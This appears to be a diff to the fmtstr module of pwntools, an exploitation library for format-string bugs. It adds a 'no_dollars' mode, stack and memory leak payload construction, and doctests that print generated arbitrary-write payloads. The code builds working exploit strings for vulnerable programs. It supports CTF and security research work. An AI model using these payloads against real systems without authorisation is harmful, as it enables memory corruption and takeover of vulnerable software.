@@ -33,6 +33,9 @@ Let's use this program as an example:
 
 We can automate the exploitation of the process like so:
 
+.. doctest::
+    :options: +POSIX +TODO
+
     >>> program = pwnlib.data.elf.fmtstr.get('i386')
     >>> def exec_fmt(payload):
     ...     p = process(program)
@@ -90,18 +93,16 @@ Example - Automated exploitation
 	format_string.execute_writes()
 
 """
-from __future__ import division
-
 import logging
 import re
 from operator import itemgetter
-from six.moves import range
 from sortedcontainers import SortedList
 
 from pwnlib.log import getLogger
 from pwnlib.memleak import MemLeak
 from pwnlib.util.cyclic import *
 from pwnlib.util.fiddling import randoms
+from pwnlib.util.misc import align
 from pwnlib.util.packing import *
 
 log = getLogger(__name__)
@@ -841,6 +842,12 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_
     The overflows argument is a format-string-length to output-amount tradeoff:
     Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.
 
+    The writes argument is a dictionary with address/value pairs like ``{addr: value, addr2: value2}``.
+    If the value is an ``int`` datatype, it will be automatically casted into a bytestring with the length of a ``long`` (8 bytes in 64-bit, 4 bytes in 32-bit).
+    If a specific number of bytes is intended to be written (such as only a single byte, single short, or single int and not an entire long),
+    then provide a bytestring like ``b'\x37\x13'`` or ``p16(0x1337)``.
+    Note that the ``write_size`` argument does not determine **total** bytes written, only the size of each consecutive write.
+
     Arguments:
         offset(int): the first formatter's offset you control
         writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
@@ -857,6 +864,8 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_
         >>> context.clear(arch = 'amd64')
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
         b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
+	>>> fmtstr_payload(1, {0x0: p32(0x1337babe)}, write_size='int')
+        b'%322419390c%3$na\x00\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
         b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
@@ -872,6 +881,8 @@ def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_
         b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')
         b'c%3$naaa\x00\x00\x00\x00'
+	>>> fmtstr_payload(1, {0x0: b'\x01'}, write_size='byte')
+	b'c%3$hhna\x00\x00\x00\x00'
         >>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')
         b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'
         >>> fmtstr_payload(10, {0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef}, no_dollars=True)
@@ -919,10 +930,11 @@ class FmtStr(object):
 
     """
 
-    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0, badbytes=frozenset()):
+    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0, badbytes=frozenset(), no_dollars=False):
         self.execute_fmt = execute_fmt
         self.offset = offset
         self.padlen = padlen
+        self.no_dollars = no_dollars
         self.numbwritten = numbwritten
         self.badbytes = badbytes
 
@@ -934,23 +946,29 @@ class FmtStr(object):
         self.leaker = MemLeak(self._leaker)
 
     def leak_stack(self, offset, prefix=b""):
-        payload = b"START%%%d$pEND" % offset
+        if self.no_dollars:
+            payload = b'%c' * (offset - 1) + b'START%pEND'
+        else:
+            payload = b"START%%%d$pEND" % offset
+
         leak = self.execute_fmt(prefix + payload)
         try:
             leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
             leak = int(leak, 16)
         except ValueError:
             leak = 0
+        except IndexError:
+            log.error("Cannot leak anything: exec_fmt not returning formatted data")
         return leak
 
     def find_offset(self):
-        marker = cyclic(20)
+        marker = cyclic(context.bytes + 3)
         for off in range(1,1000):
             leak = self.leak_stack(off, marker)
             leak = pack(leak)
 
             pad = cyclic_find(leak[:4])
-            if pad >= 0 and pad < 20:
+            if 0 <= pad < context.bytes:
                 return off, pad
         else:
             log.error("Could not find offset to format string on stack")
@@ -966,9 +984,25 @@ class FmtStr(object):
         if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == b"ELF":
             return b"\x7f"
 
+        max_len = self.padlen + 8 + context.bytes
+        for _ in range(33):
+            offset = self.offset + max_len // context.bytes
+            if self.no_dollars:
+                payload = b'%c' * (offset - 1) + b'START%sEND'
+            else:
+                payload = b"START%%%d$sEND" % offset
+            if len(payload) > max_len:
+                max_len += align(len(payload) - max_len, context.bytes)
+            else:
+                break
+        else:
+            raise RuntimeError("this is a bug ... format string building did not converge")
+
         fmtstr = fit({
-          self.padlen: b"START%%%d$sEND" % (self.offset + 16//context.bytes),
-          16 + self.padlen: addr
+          self.padlen: {
+              0: payload,
+              max_len: addr
+          }
         })
 
         leak = self.execute_fmt(fmtstr)
@@ -988,7 +1022,7 @@ class FmtStr(object):
 
         """
         fmtstr = randoms(self.padlen).encode()
-        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen + self.numbwritten, badbytes=self.badbytes, write_size='byte')
+        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen + self.numbwritten, badbytes=self.badbytes, no_dollars=self.no_dollars, write_size='byte')
         self.execute_fmt(fmtstr)
         self.writes = {}
 
@@ -999,7 +1033,7 @@ class FmtStr(object):
 
         Arguments:
             addr(int): the address where you want to write
-            data(int): the data that you want to write ``addr``
+            data(int or bytes): the data that you want to write ``addr``
 
         Returns:
             None
@@ -1013,6 +1047,10 @@ class FmtStr(object):
             >>> f.write(0x08040506, 0x1337babe)
             >>> f.execute_writes()
             b'%19c%16$hhn%36c%17$hhn%131c%18$hhn%4c%19$hhn\t\x05\x04\x08\x08\x05\x04\x08\x07\x05\x04\x08\x06\x05\x04\x08'
+            >>> f2 = FmtStr(send_fmt_payload, offset=5)
+            >>> f2.write(0x08040506, p16(0x1337))
+            >>> f2.execute_writes()
+            b'%19c%11$hhn%36c%12$hhnaa\x07\x05\x04\x08\x06\x05\x04\x08'
 
         """
         self.writes[addr] = data
